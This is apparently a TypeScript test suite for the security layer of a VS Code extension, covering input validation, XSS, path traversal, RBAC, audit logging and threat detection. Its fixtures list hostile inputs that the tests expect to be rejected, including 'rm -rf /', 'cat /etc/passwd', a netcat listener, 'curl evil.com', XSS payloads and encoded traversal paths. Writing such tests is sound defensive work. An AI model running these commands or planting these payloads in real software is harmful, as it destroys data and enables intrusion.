/**
 * Comprehensive Security Test Suite - M013 VS Code Extension
 * 
 * Tests all security components with attack simulations:
 * - Input validation and sanitization
 * - XSS prevention
 * - Command injection prevention  
 * - Path traversal protection
 * - RBAC authorization
 * - Audit logging integrity
 * - Threat detection accuracy
 * 
 * @module M013-VSCodeExtension/Tests/Security
 * @version 3.0.0
 */

import * as assert from 'assert';
import * as vscode from 'vscode';
import * as path from 'path';
import * as fs from 'fs';

// Security Components
import { InputValidator, ValidationResult } from '../../src/security/InputValidator';
import { ConfigSecure } from '../../src/security/ConfigSecure';
import { PermissionManager, UserRole, Permission, AuthorizationResult } from '../../src/security/PermissionManager';
import { AuditLogger, EventSeverity, EventCategory } from '../../src/security/AuditLogger';
import { ThreatDetector, ThreatSeverity, ThreatType } from '../../src/security/ThreatDetector';

// Mock VS Code context
const mockContext: vscode.ExtensionContext = {
    subscriptions: [],
    workspaceState: {
        get: () => undefined,
        update: async () => {},
        keys: () => []
    },
    globalState: {
        get: () => undefined,
        update: async () => {},
        keys: () => []
    },
    secrets: {
        get: async () => undefined,
        store: async () => {},
        delete: async () => {}
    },
    extensionUri: vscode.Uri.file('/test'),
    extensionPath: '/test',
    globalStorageUri: vscode.Uri.file('/test/global'),
    logUri: vscode.Uri.file('/test/logs'),
    storageUri: vscode.Uri.file('/test/storage')
} as any;

suite('Security Test Suite', () => {
    let inputValidator: InputValidator;
    let configSecure: ConfigSecure;
    let permissionManager: PermissionManager;
    let auditLogger: AuditLogger;
    let threatDetector: ThreatDetector;

    suiteSetup(async () => {
        // Initialize security components
        inputValidator = new InputValidator(mockContext);
        configSecure = new ConfigSecure(mockContext, inputValidator);
        permissionManager = new PermissionManager(mockContext, inputValidator);
        auditLogger = new AuditLogger(mockContext, inputValidator);
        threatDetector = new ThreatDetector(mockContext, inputValidator, auditLogger, permissionManager);
        
        await configSecure.initialize();
    });

    suiteTeardown(async () => {
        // Cleanup
        if (threatDetector) threatDetector.dispose();
        if (auditLogger) await auditLogger.dispose();
        if (permissionManager) await permissionManager.dispose();
        if (configSecure) configSecure.dispose();
        if (inputValidator) inputValidator.dispose();
    });

    suite('InputValidator Security Tests', () => {
        test('Should prevent command injection attacks', async () => {
            const maliciousInputs = [
                'test; rm -rf /',
                'test && echo "hacked"',
                'test | cat /etc/passwd',
                'test `whoami`',
                'test $(id)',
                'test & netcat -l 1234',
                'test || curl evil.com',
                'test; python -c "import os; os.system(\'rm -rf /\')"'
            ];

            for (const input of maliciousInputs) {
                const result = inputValidator.validateCliArguments([input]);
                assert.strictEqual(result.isValid, false, 
                    `Command injection not detected: ${input}`);
                assert.ok(result.errors.length > 0, 
                    `No error reported for: ${input}`);
                assert.ok(result.securityScore < 50, 
                    `Security score too high for: ${input}`);
            }
        });

        test('Should prevent XSS attacks in HTML content', async () => {
            const xssPayloads = [
                '<script>alert("XSS")</script>',
                '<img src="x" onerror="alert(1)">',
                'javascript:alert("XSS")',
                '<iframe src="javascript:alert(1)"></iframe>',
                '<svg onload="alert(1)">',
                '<object data="javascript:alert(1)">',
                '<embed src="javascript:alert(1)">',
                '<link href="javascript:alert(1)" rel="stylesheet">',
                '<style>@import "javascript:alert(1)";</style>',
                '<div onclick="alert(1)">Click me</div>'
            ];

            for (const payload of xssPayloads) {
                const result = inputValidator.validateHtmlContent(payload, { htmlSanitize: true });
                assert.strictEqual(result.isValid, false, 
                    `XSS not detected: ${payload}`);
                assert.ok(result.errors.length > 0, 
                    `No error reported for XSS: ${payload}`);
                
                // Check that sanitized content is safe
                if (result.sanitized) {
                    assert.ok(!result.sanitized.includes('<script'), 
                        `Script tag not removed: ${result.sanitized}`);
                    assert.ok(!result.sanitized.includes('javascript:'), 
                        `Javascript URL not removed: ${result.sanitized}`);
                    assert.ok(!result.sanitized.includes('onerror='), 
                        `Event handler not removed: ${result.sanitized}`);
                }
            }
        });

        test('Should prevent path traversal attacks', async () => {
            const pathTraversalPayloads = [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\config\\sam',
                '/etc/passwd',
                'C:\\Windows\\System32\\config\\SAM',
                '....//....//....//etc/passwd',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64',
                '..%252f..%252f..%252fetc%252fpasswd',
                '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
                '/var/log/../../../etc/passwd',
                'test/../../etc/passwd'
            ];

            for (const payload of pathTraversalPayloads) {
                const result = inputValidator.validateFilePath(payload, {
                    requireWorkspaceScope: true
                });
                assert.strictEqual(result.isValid, false, 
                    `Path traversal not detected: ${payload}`);
                assert.ok(result.errors.length > 0, 
                    `No error reported for path traversal: ${payload}`);
            }
        });

        test('Should enforce rate limiting', async () => {
            const testKey = 'test-rate-limit';
            const limit = 5;
            
            // First 5 requests should pass
            for (let i = 0; i < limit; i++) {
                const result = inputValidator.validateRateLimit(testKey, limit);
                assert.strictEqual(result.isValid, true, 
                    `Rate limit failed at request ${i + 1}`);
            }
            
            // 6th request should fail
            const result = inputValidator.validateRateLimit(testKey, limit);
            assert.strictEqual(result.isValid, false, 
                'Rate limit not enforced after limit exceeded');
            assert.ok(result.errors.some(err => err.includes('Rate limit exceeded')), 
                'Rate limit error message not provided');
        });

        test('Should validate webview messages securely', async () => {
            const maliciousMessages = [
                { command: 'test; rm -rf /', data: 'normal' },
                { command: '<script>alert(1)</script>', data: 'xss' },
                { command: 'valid', data: '<img src=x onerror=alert(1)>' },
                { command: '../../../etc/passwd', data: 'traversal' },
                { command: 'A'.repeat(1000), data: 'overflow' },
                null,
                undefined,
                '',
                { malformed: true },
                { command: null, data: null }
            ];

            for (const message of maliciousMessages) {
                const result = inputValidator.validateWebviewMessage(message);
                
                if (message === null || message === undefined || message === '') {
                    assert.strictEqual(result.isValid, false, 
                        `Null/undefined/empty message should be invalid`);
                } else if (typeof message === 'object' && message.command) {
                    // Check that dangerous commands are detected
                    if (message.command.includes(';') || 
                        message.command.includes('<script') || 
                        message.command.includes('../')) {
                        assert.strictEqual(result.isValid, false, 
                            `Malicious command not detected: ${message.command}`);
                    }
                }
            }
        });
    });

    suite('ConfigSecure API Key Protection Tests', () => {
        test('Should securely store and retrieve API keys', async () => {
            const testApiKey = 'sk-test-1234567890abcdef1234567890abcdef1234567890abcdef';
            
            // Store API key
            const storeResult = await configSecure.storeSecret('openai_api_key', testApiKey);
            assert.strictEqual(storeResult.isValid, true, 
                'Failed to store API key securely');
            
            // Retrieve API key
            const retrievedKey = await configSecure.getSecret('openai_api_key');
            assert.strictEqual(retrievedKey, testApiKey, 
                'Retrieved API key does not match stored key');
            
            // Delete API key
            const deleteResult = await configSecure.deleteSecret('openai_api_key');
            assert.strictEqual(deleteResult.isValid, true, 
                'Failed to delete API key');
            
            // Verify deletion
            const deletedKey = await configSecure.getSecret('openai_api_key');
            assert.strictEqual(deletedKey, undefined, 
                'API key still accessible after deletion');
        });

        test('Should validate API key strength', async () => {
            const weakKeys = [
                'password',
                '123456',
                'a',
                'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',
                'key123',
                'secret'
            ];

            for (const weakKey of weakKeys) {
                const result = await configSecure.storeSecret('test_key', weakKey);
                assert.strictEqual(result.isValid, false, 
                    `Weak key accepted: ${weakKey}`);
                assert.ok(result.errors.length > 0, 
                    `No error for weak key: ${weakKey}`);
            }
        });

        test('Should detect compromised credentials', async () => {
            // Test with fake compromised credentials
            const compromisedPatterns = [
                'AKIA1234567890ABCDEF', // AWS access key pattern
                'pk_test_1234567890abcdef', // Stripe test key
                'sk_live_1234567890abcdef', // Stripe live key
                'ya29.1234567890abcdef', // Google OAuth token
                'ghp_1234567890abcdef', // GitHub personal access token
            ];

            for (const pattern of compromisedPatterns) {
                // This would integrate with breach databases in production
                const result = await configSecure.storeSecret('test_compromised', pattern);
                // For now, just verify the storage validation works
                assert.ok(result.isValid !== undefined, 
                    'Storage validation not performed');
            }
        });
    });

    suite('PermissionManager RBAC Tests', () => {
        test('Should enforce role-based command authorization', async () => {
            // Test command authorization for different roles
            const testCases = [
                { command: 'devdocai.generateDocumentation', role: UserRole.BASIC, shouldPass: true },
                { command: 'devdocai.runSecurityScan', role: UserRole.BASIC, shouldPass: false },
                { command: 'devdocai.runSecurityScan', role: UserRole.ADMIN, shouldPass: true },
                { command: 'devdocai.configureSettings', role: UserRole.BASIC, shouldPass: false },
                { command: 'devdocai.configureSettings', role: UserRole.POWER, shouldPass: true },
                { command: 'unknown.command', role: UserRole.ENTERPRISE, shouldPass: false }
            ];

            for (const testCase of testCases) {
                // Set user role (this would normally be done during authentication)
                // For testing, we'll create a test permission manager instance
                const testPermissionManager = new PermissionManager(mockContext, inputValidator);
                
                const result = await testPermissionManager.authorizeCommand(testCase.command);
                
                if (testCase.shouldPass) {
                    assert.strictEqual(result.granted, true, 
                        `Command ${testCase.command} should be allowed for role ${UserRole[testCase.role]}`);
                } else {
                    assert.strictEqual(result.granted, false, 
                        `Command ${testCase.command} should be denied for role ${UserRole[testCase.role]}`);
                    assert.ok(result.reason, 
                        'Denial reason should be provided');
                }
            }
        });

        test('Should prevent privilege escalation', async () => {
            // Test that lower roles cannot escalate to higher roles without proper authorization
            const basicUser = new PermissionManager(mockContext, inputValidator);
            
            const escalationResult = await basicUser.elevateRole(
                UserRole.ADMIN, 
                60000, // 1 minute
                'Test escalation'
            );
            
            assert.strictEqual(escalationResult.granted, false, 
                'Basic user should not be able to escalate to admin');
            assert.ok(escalationResult.reason.includes('Insufficient privileges'), 
                'Correct denial reason not provided');
        });

        test('Should enforce session timeouts', async () => {
            // This test would verify session timeout enforcement
            // For now, we test the session validity check
            assert.ok(permissionManager.getUserRole() !== undefined, 
                'User role should be defined');
            
            const permissions = permissionManager.getUserPermissions();
            assert.ok(Array.isArray(permissions), 
                'User permissions should be an array');
        });
    });

    suite('AuditLogger Security Event Logging Tests', () => {
        test('Should log security events with integrity', async () => {
            const testEvent = {
                action: 'test_security_event',
                resource: '/test/resource',
                details: 'Test security event for audit logging'
            };

            // Log various types of security events
            await auditLogger.logThreat('test_threat', EventSeverity.HIGH, 
                'Test threat detection', testEvent);
            
            await auditLogger.logAuthorization('/test/resource', Permission.GENERATE_DOC, 
                false, 'Access denied for testing');
            
            await auditLogger.logDataAccess('read', '/sensitive/data', true, 1024);
            
            await auditLogger.logError(new Error('Test security error'), 'security_test');

            // Verify logs were created
            const logs = await auditLogger.getAuditLogs({ limit: 10 });
            assert.ok(logs.length > 0, 'No audit logs were created');
            
            // Check log integrity
            const integrityCheck = await auditLogger.verifyIntegrity();
            assert.strictEqual(integrityCheck.valid, true, 
                'Audit log integrity check failed');
            assert.strictEqual(integrityCheck.corruptedEntries, 0, 
                'Corrupted entries found in audit log');
        });

        test('Should mask PII in audit logs', async () => {
            const piiData = {
                email: 'user@example.com',
                ipAddress: '192.168.1.100',
                userPath: '/Users/johndoe/documents',
                apiKey: 'sk-1234567890abcdef1234567890abcdef',
                password: 'mySecretPassword123'
            };

            await auditLogger.logEvent(
                EventSeverity.INFO,
                EventCategory.DATA_ACCESS,
                'pii_test',
                'pii_resource',
                true,
                'Test PII masking in audit logs',
                piiData
            );

            const logs = await auditLogger.getAuditLogs({ limit: 1 });
            assert.ok(logs.length > 0, 'PII test log not created');
            
            const logEntry = logs[0];
            const logStr = JSON.stringify(logEntry);
            
            // Verify PII is masked
            assert.ok(!logStr.includes('user@example.com'), 'Email not masked');
            assert.ok(!logStr.includes('192.168.1.100'), 'IP address not masked');
            assert.ok(!logStr.includes('johndoe'), 'Username not masked');
            assert.ok(!logStr.includes('sk-1234567890abcdef'), 'API key not masked');
            assert.ok(!logStr.includes('mySecretPassword123'), 'Password not masked');
            
            // Verify masking placeholders are present
            assert.ok(logStr.includes('[EMAIL]') || 
                     logStr.includes('[IP]') || 
                     logStr.includes('[USER]') || 
                     logStr.includes('[TOKEN]') || 
                     logStr.includes('[PASSWORD]'), 
                'PII masking placeholders not found');
        });
    });

    suite('ThreatDetector Real-time Monitoring Tests', () => {
        test('Should detect command injection patterns', async () => {
            const maliciousEvent = {
                category: 'system',
                action: 'execute_command',
                command: 'ls; rm -rf /',
                userId: 'test-user',
                timestamp: Date.now()
            };

            const detections = await threatDetector.analyzeEvent(maliciousEvent);
            
            assert.ok(detections.length > 0, 'Command injection not detected');
            
            const commandInjectionDetection = detections.find(d => 
                d.type === ThreatType.EXECUTION &&
                d.description.includes('Command Injection')
            );
            
            assert.ok(commandInjectionDetection, 'Command injection threat not identified');
            assert.ok(commandInjectionDetection.severity >= ThreatSeverity.HIGH, 
                'Command injection severity too low');
            assert.ok(commandInjectionDetection.confidence > 80, 
                'Command injection confidence too low');
        });

        test('Should detect XSS attack patterns', async () => {
            const xssEvent = {
                category: 'web',
                action: 'submit_form',
                data: '<script>alert("XSS")</script>',
                resource: 'webview',
                userId: 'test-user',
                timestamp: Date.now()
            };

            const detections = await threatDetector.analyzeEvent(xssEvent);
            
            const xssDetection = detections.find(d => 
                d.type === ThreatType.INITIAL_ACCESS &&
                d.description.includes('Cross-Site Scripting')
            );
            
            if (xssDetection) {
                assert.ok(xssDetection.severity >= ThreatSeverity.HIGH, 
                    'XSS severity too low');
                assert.ok(xssDetection.confidence > 70, 
                    'XSS confidence too low');
            }
        });

        test('Should detect behavioral anomalies', async () => {
            const userId = 'test-anomaly-user';
            const baselineEvents = [];
            
            // Create baseline behavior (normal frequency)
            for (let i = 0; i < 5; i++) {
                baselineEvents.push({
                    userId,
                    action: 'normal_action',
                    timestamp: Date.now() - (i * 60000) // 1 minute intervals
                });
            }

            // Process baseline events
            for (const event of baselineEvents) {
                await threatDetector.analyzeEvent(event);
            }

            // Now send anomalous burst of activity
            const anomalousEvents = [];
            for (let i = 0; i < 20; i++) {
                anomalousEvents.push({
                    userId,
                    action: 'normal_action',
                    timestamp: Date.now()
                });
            }

            let anomalyDetected = false;
            for (const event of anomalousEvents) {
                const detections = await threatDetector.analyzeEvent(event);
                if (detections.some(d => d.description.includes('anomaly'))) {
                    anomalyDetected = true;
                    break;
                }
            }

            assert.ok(anomalyDetected, 'Behavioral anomaly not detected');
        });

        test('Should auto-respond to critical threats', async () => {
            const criticalThreatEvent = {
                userId: 'malicious-user',
                action: 'bulk_data_export',
                metadata: { dataSize: 10000000 }, // 10MB
                resource: '/sensitive/data',
                timestamp: Date.now()
            };

            const detections = await threatDetector.analyzeEvent(criticalThreatEvent);
            
            // Check if user was quarantined
            const isQuarantined = threatDetector.isUserQuarantined('malicious-user');
            
            if (detections.some(d => d.severity === ThreatSeverity.CRITICAL)) {
                assert.ok(isQuarantined, 
                    'Critical threat did not trigger user quarantine');
            }
        });

        test('Should provide accurate threat metrics', async () => {
            const metrics = threatDetector.getMetrics();
            
            assert.ok(typeof metrics.threatsDetected === 'number', 
                'Threats detected metric not available');
            assert.ok(typeof metrics.autoMitigations === 'number', 
                'Auto mitigations metric not available');
            assert.ok(typeof metrics.averageDetectionTime === 'number', 
                'Average detection time metric not available');
            assert.ok(typeof metrics.activeRules === 'number', 
                'Active rules metric not available');
        });
    });

    suite('Performance Security Tests', () => {
        test('Should maintain performance with security enabled', async () => {
            const startTime = Date.now();
            const iterations = 100;
            
            // Test input validation performance
            for (let i = 0; i < iterations; i++) {
                inputValidator.validateCliArguments([
                    'test-command',
                    '/test/path/file.txt',
                    '--option', 'value'
                ]);
            }
            
            const inputValidationTime = Date.now() - startTime;
            const avgInputValidationTime = inputValidationTime / iterations;
            
            // Input validation should be fast (< 5ms per validation)
            assert.ok(avgInputValidationTime < 5, 
                `Input validation too slow: ${avgInputValidationTime}ms per validation`);

            // Test audit logging performance
            const auditStartTime = Date.now();
            
            const auditPromises = [];
            for (let i = 0; i < 50; i++) {
                auditPromises.push(
                    auditLogger.logEvent(
                        EventSeverity.INFO,
                        EventCategory.USER_ACTIVITY,
                        'performance_test',
                        'test_resource',
                        true,
                        `Performance test iteration ${i}`
                    )
                );
            }
            
            await Promise.all(auditPromises);
            const auditTime = Date.now() - auditStartTime;
            const avgAuditTime = auditTime / 50;
            
            // Audit logging should be efficient (< 10ms per log entry)
            assert.ok(avgAuditTime < 10, 
                `Audit logging too slow: ${avgAuditTime}ms per entry`);
        });

        test('Should have low memory footprint', async () => {
            // This is a basic test - in production you'd use proper memory profiling
            const initialMemory = process.memoryUsage();
            
            // Perform security operations
            for (let i = 0; i < 1000; i++) {
                inputValidator.validateParameter(`test_param_${i}`, `test_value_${i}`);
                
                if (i % 100 === 0) {
                    await auditLogger.logEvent(
                        EventSeverity.LOW,
                        EventCategory.PERFORMANCE,
                        'memory_test',
                        'memory',
                        true,
                        `Memory test iteration ${i}`
                    );
                }
            }
            
            const finalMemory = process.memoryUsage();
            const memoryIncrease = finalMemory.heapUsed - initialMemory.heapUsed;
            
            // Memory increase should be reasonable (< 50MB for 1000 operations)
            assert.ok(memoryIncrease < 50 * 1024 * 1024, 
                `Memory increase too high: ${Math.round(memoryIncrease / 1024 / 1024)}MB`);
        });
    });

    suite('Integration Security Tests', () => {
        test('Should coordinate between all security components', async () => {
            const testUserId = 'integration-test-user';
            const testCommand = 'devdocai.generateDocumentation';
            const testResource = '/test/integration/file.txt';
            
            // Step 1: Validate input
            const inputResult = inputValidator.validateParameter('userId', testUserId);
            assert.strictEqual(inputResult.isValid, true, 
                'Valid user ID failed validation');
            
            // Step 2: Check authorization
            const authResult = await permissionManager.authorizeCommand(testCommand);
            assert.ok(authResult.granted !== undefined, 
                'Authorization check not performed');
            
            // Step 3: Log the operation
            await auditLogger.logEvent(
                EventSeverity.INFO,
                EventCategory.USER_ACTIVITY,
                'integration_test',
                testResource,
                authResult.granted,
                `Integration test for user ${testUserId}`
            );
            
            // Step 4: Analyze for threats
            const threatAnalysis = await threatDetector.analyzeEvent({
                userId: testUserId,
                action: 'integration_test',
                resource: testResource,
                authorized: authResult.granted,
                timestamp: Date.now()
            });
            
            // Integration should work without errors
            assert.ok(Array.isArray(threatAnalysis), 
                'Threat analysis failed');
            
            // Verify audit log was created
            const logs = await auditLogger.getAuditLogs({ 
                userId: testUserId,
                limit: 1 
            });
            assert.ok(logs.length > 0, 
                'Integration test not logged');
        });

        test('Should handle security component failures gracefully', async () => {
            // Test what happens when individual security components fail
            // This ensures the extension remains functional even if security is compromised
            
            try {
                // Simulate input validator failure
                const result = inputValidator.validateParameter('test', null as any);
                assert.ok(result, 'Input validator should handle null gracefully');
            } catch (error) {
                assert.fail('Input validator should not throw on null input');
            }
            
            try {
                // Simulate audit logger failure (non-existent log file)
                // The system should continue working even if logging fails
                await auditLogger.logError(new Error('Test error'), 'graceful_failure_test');
            } catch (error) {
                // Logging failure should not crash the extension
                console.warn('Audit logging failed gracefully:', error);
            }
        });
    });
});

// Export test utilities for use in other test files
export {
    mockContext,
    InputValidator,
    ConfigSecure,
    PermissionManager,
    AuditLogger,
    ThreatDetector
};